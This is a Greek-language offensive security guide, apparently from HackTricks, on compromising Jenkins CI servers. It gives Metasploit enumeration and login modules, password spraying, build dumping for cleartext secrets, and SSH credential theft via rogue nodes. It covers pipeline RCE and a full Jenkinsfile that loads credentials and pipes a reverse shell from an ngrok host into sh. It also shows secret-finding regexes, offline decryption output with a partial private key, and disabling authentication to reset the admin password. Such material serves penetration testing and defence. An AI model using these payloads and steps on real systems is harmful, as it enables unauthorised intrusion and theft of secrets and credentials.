# Jenkins Security

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Βασικές Πληροφορίες

Το Jenkins είναι ένα εργαλείο που προσφέρει έναν απλό τρόπο για την εγκαθίδρυση ενός περιβάλλοντος **continuous integration** ή **continuous delivery** (CI/CD) για σχεδόν **οποιονδήποτε** συνδυασμό **γλωσσών προγραμματισμού** και αποθετηρίων πηγαίου κώδικα χρησιμοποιώντας pipelines. Επιπλέον, αυτοματοποιεί διάφορες ρουτίνες αναπτυξιακές εργασίες. Ενώ το Jenkins δεν εξαλείφει την **ανάγκη δημιουργίας scripts για μεμονωμένα βήματα**, παρέχει έναν ταχύτερο και πιο ανθεκτικό τρόπο για την ενσωμάτωση ολόκληρης της ακολουθίας εργαλείων build, test, και deployment από ό,τι μπορεί κανείς εύκολα να κατασκευάσει χειροκίνητα.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Μη Αυθεντικοποιημένη Καταμέτρηση

Για να αναζητήσετε ενδιαφέρουσες σελίδες Jenkins χωρίς αυθεντικοποίηση όπως (_/people_ ή _/asynchPeople_, που καταγράφουν τους τρέχοντες χρήστες) μπορείτε να χρησιμοποιήσετε:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
```markdown
Ελέγξτε αν μπορείτε να εκτελέσετε εντολές χωρίς να απαιτείται αυθεντικοποίηση:
```
```
msf> use auxiliary/scanner/http/jenkins_command
```
Χωρίς διαπιστευτήρια μπορείτε να κοιτάξετε μέσα στο _**/asynchPeople/**_ path ή _**/securityRealm/user/admin/search/index?q=**_ για **usernames**.

Μπορείτε να πάρετε την έκδοση του Jenkins από το path _**/oops**_ ή _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Γνωστές Ευπάθειες

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Σύνδεση

Στις βασικές πληροφορίες μπορείτε να ελέγξετε **όλους τους τρόπους σύνδεσης στο Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Εγγραφή

Θα μπορέσετε να βρείτε Jenkins instances που **σας επιτρέπουν να δημιουργήσετε έναν λογαριασμό και να συνδεθείτε σε αυτό. Τόσο απλά.**

### **SSO Σύνδεση**

Επίσης, αν η **SSO** **λειτουργικότητα**/**plugins** είναι παρόντα, τότε θα πρέπει να προσπαθήσετε να **συνδεθείτε** στην εφαρμογή χρησιμοποιώντας έναν δοκιμαστικό λογαριασμό (π.χ., έναν δοκιμαστικό **Github/Bitbucket λογαριασμό**). Κόλπο από [**εδώ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

Το **Jenkins** δεν έχει **πολιτική κωδικών** και **mitigation για brute-force usernames**. Είναι απαραίτητο να κάνετε **brute-force** στους χρήστες, καθώς μπορεί να χρησιμοποιούνται **αδύναμοι κωδικοί** ή **usernames ως κωδικοί**, ακόμα και **ανεστραμμένα usernames ως κωδικοί**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Χρησιμοποιήστε [αυτό το python script](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ή [αυτό το powershell script](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Πολλές οργανώσεις συνδυάζουν **SaaS-based source control management (SCM) systems** όπως το GitHub ή το GitLab με μια **εσωτερική, αυτο-φιλοξενούμενη CI** λύση όπως το Jenkins ή το TeamCity. Αυτή η ρύθμιση επιτρέπει στα CI συστήματα να **λαμβάνουν webhook events από τους SaaS source control vendors**, κυρίως για την ενεργοποίηση pipeline jobs.

Για να το επιτύχουν αυτό, οι οργανώσεις **whitelist** τις **IP ranges** των **SCM platforms**, επιτρέποντάς τους να έχουν πρόσβαση στο **εσωτερικό CI σύστημα** μέσω **webhooks**. Ωστόσο, είναι σημαντικό να σημειωθεί ότι **οποιοσδήποτε** μπορεί να δημιουργήσει έναν **λογαριασμό** στο GitHub ή το GitLab και να τον ρυθμίσει για να **ενεργοποιεί ένα webhook**, ενδεχομένως στέλνοντας αιτήματα στο **εσωτερικό CI σύστημα**.

Δείτε: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Internal Jenkins Abuses

Σε αυτά τα σενάρια θα υποθέσουμε ότι έχετε έναν έγκυρο λογαριασμό για πρόσβαση στο Jenkins.

{% hint style="warning" %}
Ανάλογα με τον **μηχανισμό εξουσιοδότησης** που έχει ρυθμιστεί στο Jenkins και τα δικαιώματα του παραβιασμένου χρήστη, **μπορεί να είστε σε θέση ή όχι να εκτελέσετε τις παρακάτω επιθέσεις.**
{% endhint %}

Για περισσότερες πληροφορίες δείτε τις βασικές πληροφορίες:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

Εάν έχετε πρόσβαση στο Jenkins, μπορείτε να καταγράψετε άλλους εγγεγραμμένους χρήστες στο [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds to find cleartext secrets

Χρησιμοποιήστε [αυτό το script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) για να απορρίψετε τις εξόδους της κονσόλας των builds και τις μεταβλητές περιβάλλοντος των builds, ελπίζοντας να βρείτε cleartext secrets.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Κλοπή Διαπιστευτηρίων SSH**

Εάν ο παραβιασμένος χρήστης έχει **αρκετά προνόμια για να δημιουργήσει/τροποποιήσει έναν νέο κόμβο Jenkins** και τα διαπιστευτήρια SSH είναι ήδη αποθηκευμένα για πρόσβαση σε άλλους κόμβους, θα μπορούσε **να κλέψει αυτά τα διαπιστευτήρια** δημιουργώντας/τροποποιώντας έναν κόμβο και **ορίζοντας έναν κεντρικό υπολογιστή που θα καταγράφει τα διαπιστευτήρια** χωρίς να επαληθεύει το κλειδί του κεντρικού υπολογιστή:

![](<../../.gitbook/assets/image (218).png>)

Συνήθως θα βρείτε διαπιστευτήρια ssh Jenkins σε έναν **παγκόσμιο πάροχο** (`/credentials/`), οπότε μπορείτε επίσης να τα απορρίψετε όπως θα απορρίπτατε οποιοδήποτε άλλο μυστικό. Περισσότερες πληροφορίες στην [**Ενότητα απόρριψης μυστικών**](./#dumping-secrets).

### **RCE στο Jenkins**

Η απόκτηση ενός **κελύφους στον διακομιστή Jenkins** δίνει στον επιτιθέμενο την ευκαιρία να διαρρεύσει όλα τα **μυστικά** και τις **μεταβλητές περιβάλλοντος** και να **εκμεταλλευτεί άλλες μηχανές** που βρίσκονται στο ίδιο δίκτυο ή ακόμα και να **συλλέξει διαπιστευτήρια cloud**.

Από προεπιλογή, το Jenkins θα **τρέχει ως SYSTEM**. Έτσι, η παραβίασή του θα δώσει στον επιτιθέμενο **προνόμια SYSTEM**.

### **RCE Δημιουργία/Τροποποίηση έργου**

Η δημιουργία/τροποποίηση ενός έργου είναι ένας τρόπος για να αποκτήσετε RCE στον διακομιστή Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Εκτέλεση Groovy script**

Μπορείτε επίσης να αποκτήσετε RCE εκτελώντας ένα Groovy script, το οποίο μπορεί να είναι πιο διακριτικό από τη δημιουργία ενός νέου έργου:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Δημιουργία/Τροποποίηση Pipeline

Μπορείτε επίσης να αποκτήσετε **RCE δημιουργώντας/τροποποιώντας ένα pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Εκμετάλλευση Pipeline

Για να εκμεταλλευτείτε τα pipelines, πρέπει να έχετε πρόσβαση στο Jenkins.

### Build Pipelines

Τα **pipelines** μπορούν επίσης να χρησιμοποιηθούν ως **μηχανισμός build σε έργα**, σε αυτή την περίπτωση μπορεί να διαμορφωθεί ένα **αρχείο μέσα στο αποθετήριο** που θα περιέχει τη σύνταξη του pipeline. Από προεπιλογή χρησιμοποιείται το `/Jenkinsfile`:

![](<../../.gitbook/assets/image (127).png>)

Είναι επίσης δυνατό να **αποθηκεύσετε αρχεία διαμόρφωσης pipeline σε άλλα μέρη** (για παράδειγμα σε άλλα αποθετήρια) με στόχο τον **διαχωρισμό** της **πρόσβασης** στο αποθετήριο και την πρόσβαση στο pipeline.

Εάν ένας επιτιθέμενος έχει **δικαιώματα εγγραφής σε αυτό το αρχείο**, θα μπορεί να το **τροποποιήσει** και **ενδεχομένως να ενεργοποιήσει** το pipeline χωρίς καν να έχει πρόσβαση στο Jenkins.\
Είναι πιθανό ο επιτιθέμενος να χρειαστεί να **παρακάμψει κάποιες προστασίες κλάδων** (ανάλογα με την πλατφόρμα και τα προνόμια του χρήστη, μπορεί να παρακαμφθούν ή όχι).

Οι πιο συνηθισμένοι τρόποι ενεργοποίησης ενός προσαρμοσμένου pipeline είναι:

* **Αίτημα έλξης** στον κύριο κλάδο (ή ενδεχομένως σε άλλους κλάδους)
* **Προώθηση στον κύριο κλάδο** (ή ενδεχομένως σε άλλους κλάδους)
* **Ενημέρωση του κύριου κλάδου** και αναμονή μέχρι να εκτελεστεί με κάποιο τρόπο

{% hint style="info" %}
Εάν είστε **εξωτερικός χρήστης**, δεν θα πρέπει να περιμένετε να δημιουργήσετε ένα **PR στον κύριο κλάδο** του αποθετηρίου **άλλου χρήστη/οργανισμού** και να **ενεργοποιήσετε το pipeline**... αλλά αν είναι **κακώς διαμορφωμένο**, θα μπορούσατε να **παραβιάσετε πλήρως εταιρείες απλώς εκμεταλλευόμενοι αυτό**.
{% endhint %}

### Pipeline RCE

Στην προηγούμενη ενότητα RCE είχε ήδη υποδειχθεί μια τεχνική για να [**αποκτήσετε RCE τροποποιώντας ένα pipeline**](./#rce-creating-modifying-pipeline).

### Έλεγχος μεταβλητών περιβάλλοντος

Είναι δυνατό να δηλώσετε **μεταβλητές περιβάλλοντος σε απλό κείμενο** για ολόκληρο το pipeline ή για συγκεκριμένα στάδια. Αυτές οι μεταβλητές περιβάλλοντος **δεν πρέπει να περιέχουν ευαίσθητες πληροφορίες**, αλλά ένας επιτιθέμενος θα μπορούσε πάντα να **ελέγξει όλες τις διαμορφώσεις του pipeline/Jenkinsfiles**:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Απόρριψη μυστικών

Για πληροφορίες σχετικά με το πώς συνήθως αντιμετωπίζονται τα μυστικά από το Jenkins, δείτε τις βασικές πληροφορίες:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Τα διαπιστευτήρια μπορούν να είναι **περιορισμένα σε παγκόσμιους παρόχους** (`/credentials/`) ή σε **συγκεκριμένα έργα** (`/job/<project-name>/configure`). Επομένως, για να εξάγετε όλα αυτά, πρέπει να **παραβιάσετε τουλάχιστον όλα τα έργα** που περιέχουν μυστικά και να εκτελέσετε προσαρμοσμένους/δηλητηριασμένους αγωγούς.

Υπάρχει ένα άλλο πρόβλημα, για να πάρετε ένα **μυστικό μέσα στο env** ενός αγωγού, πρέπει να **γνωρίζετε το όνομα και τον τύπο του μυστικού**. Για παράδειγμα, αν προσπαθήσετε να **φορτώσετε** ένα **`usernamePassword`** **μυστικό** ως **`string`** **μυστικό**, θα λάβετε αυτό το **σφάλμα**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Εδώ είναι ο τρόπος φόρτωσης ορισμένων κοινών τύπων μυστικών:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Στο τέλος αυτής της σελίδας μπορείτε **να βρείτε όλους τους τύπους διαπιστευτηρίων**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
Ο καλύτερος τρόπος για **να απορρίψετε όλα τα μυστικά ταυτόχρονα** είναι με το **να παραβιάσετε** τη μηχανή **Jenkins** (τρέχοντας ένα reverse shell στον **built-in node** για παράδειγμα) και στη συνέχεια **να διαρρεύσετε** τα **master keys** και τα **κρυπτογραφημένα μυστικά** και να τα αποκρυπτογραφήσετε offline.\
Περισσότερα για το πώς να το κάνετε αυτό στην [ενότητα Nodes & Agents](./#nodes-and-agents) και στην [ενότητα Post Exploitation](./#post-exploitation).
{% endhint %}

### Triggers

Από [τα έγγραφα](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): Η οδηγία `triggers` ορίζει τους **αυτοματοποιημένους τρόπους με τους οποίους η Pipeline πρέπει να επανεκκινείται**. Για Pipelines που είναι ενσωματωμένες με μια πηγή όπως το GitHub ή το BitBucket, οι `triggers` μπορεί να μην είναι απαραίτητες καθώς η ενσωμάτωση με βάση τα webhooks πιθανότατα θα είναι ήδη παρούσα. Οι triggers που είναι διαθέσιμες αυτή τη στιγμή είναι `cron`, `pollSCM` και `upstream`.

Παράδειγμα Cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **άλλα παραδείγματα στα έγγραφα**.

### Nodes & Agents

Μια **Jenkins instance** μπορεί να έχει **διαφορετικούς agents που τρέχουν σε διαφορετικές μηχανές**. Από την προοπτική ενός επιτιθέμενου, η πρόσβαση σε διαφορετικές μηχανές σημαίνει **διαφορετικά potential cloud credentials** για κλοπή ή **διαφορετική πρόσβαση στο δίκτυο** που θα μπορούσε να χρησιμοποιηθεί για την εκμετάλλευση άλλων μηχανών.

Για περισσότερες πληροφορίες ελέγξτε τις βασικές πληροφορίες:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Μπορείτε να απαριθμήσετε τους **διαμορφωμένους nodes** στο `/computer/`, συνήθως θα βρείτε τον **`Built-In Node`** (ο οποίος είναι ο node που τρέχει το Jenkins) και πιθανώς περισσότερους:

![](<../../.gitbook/assets/image (249).png>)

Είναι **ιδιαίτερα ενδιαφέρον να παραβιάσετε τον Built-In node** επειδή περιέχει ευαίσθητες πληροφορίες του Jenkins.

Για να υποδείξετε ότι θέλετε να **τρέξετε** το **pipeline** στον **built-in Jenkins node** μπορείτε να καθορίσετε μέσα στο pipeline την ακόλουθη ρύθμιση:
```bash
pipeline {
agent {label 'built-in'}
```
### Πλήρες παράδειγμα

Pipeline σε συγκεκριμένο agent, με cron trigger, με pipeline και stage μεταβλητές περιβάλλοντος, φόρτωση 2 μεταβλητών σε ένα βήμα και αποστολή reverse shell:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Μετα-εκμετάλλευση

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

Μπορείτε να καταγράψετε τα secrets αποκτώντας πρόσβαση στο `/credentials/` αν έχετε αρκετά δικαιώματα. Σημειώστε ότι αυτό θα καταγράψει μόνο τα secrets μέσα στο αρχείο `credentials.xml`, αλλά **τα αρχεία διαμόρφωσης build** μπορεί επίσης να έχουν **περισσότερα credentials**.

Αν μπορείτε να **δείτε τη διαμόρφωση κάθε έργου**, μπορείτε επίσης να δείτε εκεί τα **ονόματα των credentials (secrets)** που χρησιμοποιούνται για την πρόσβαση στο αποθετήριο και **άλλα credentials του έργου**.

![](<../../.gitbook/assets/image (180).png>)

#### Από Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Από δίσκο

Αυτά τα αρχεία είναι απαραίτητα για να **αποκρυπτογραφήσετε τα Jenkins secrets**:

* secrets/master.key
* secrets/hudson.util.Secret

Τέτοια **secrets συνήθως βρίσκονται σε**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Ακολουθεί ένα regex για να τα βρείτε:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

Αν έχετε αποθηκεύσει τους **απαραίτητους κωδικούς για να αποκρυπτογραφήσετε τα secrets**, χρησιμοποιήστε [**αυτό το script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **για να αποκρυπτογραφήσετε αυτά τα secrets**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Αποκρυπτογράφηση Jenkins secrets από Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Δημιουργία νέου διαχειριστή χρήστη

1. Πρόσβαση στο αρχείο config.xml του Jenkins στο `/var/lib/jenkins/config.xml` ή `C:\Program Files (x86)\Jenkis\`
2. Αναζητήστε τη λέξη `<useSecurity>true</useSecurity>` και αλλάξτε τη λέξη **`true`** σε **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Επανεκκινήστε** τον **Jenkins** server: `service jenkins restart`
4. Τώρα πηγαίνετε ξανά στην πύλη του Jenkins και **ο Jenkins δεν θα ζητήσει διαπιστευτήρια** αυτή τη φορά. Μεταβείτε στο "**Manage Jenkins**" για να ορίσετε ξανά τον **κωδικό διαχειριστή**.
5. **Ενεργοποιήστε** ξανά την **ασφάλεια** αλλάζοντας τις ρυθμίσεις σε `<useSecurity>true</useSecurity>` και **επανεκκινήστε ξανά τον Jenkins**.

## Αναφορές

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετάσχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
